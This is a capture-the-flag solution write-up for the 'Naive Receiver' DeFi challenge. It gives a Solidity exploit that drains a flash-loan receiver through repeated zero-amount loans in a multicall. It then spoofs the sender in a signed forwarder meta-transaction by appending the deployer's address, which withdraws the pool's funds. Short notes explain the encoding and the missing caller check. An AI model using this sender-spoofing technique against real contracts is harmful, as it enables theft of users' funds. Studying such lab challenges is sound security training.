# Naive Receiver

```
uint size = 10;
        bytes[] memory data = new bytes[](size);
        for(uint i = 0; i < size; i++){
            data[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, ""));
        }
        pool.multicall(data);

        bytes[] memory data_call = new bytes[](1);
        data_call[0] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))), deployer);

        bytes memory callData;
        callData = abi.encodeCall(pool.multicall, data_call);
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: 30_000_000,
            nonce: forwarder.nonces(player),
            data: callData,
            deadline: block.timestamp + block.timestamp
        });
        
        bytes32 requestHash = keccak256(
            abi.encodePacked(
                "\x19\x01",
                forwarder.domainSeparator(),
                forwarder.getDataHash(request)
            )
        );
        (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        forwarder.execute(request, signature);
```

To make a signature you need requestHash and it has a field like “\x19\x01” which is part of the standard.

abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),deployer)
Inside we do encodeCall and fill the parameters and then through encodePacked we add more data to the call and package them together.

Flashloans receivers should optionally have a check on who is making the call as it was in the unstoppable
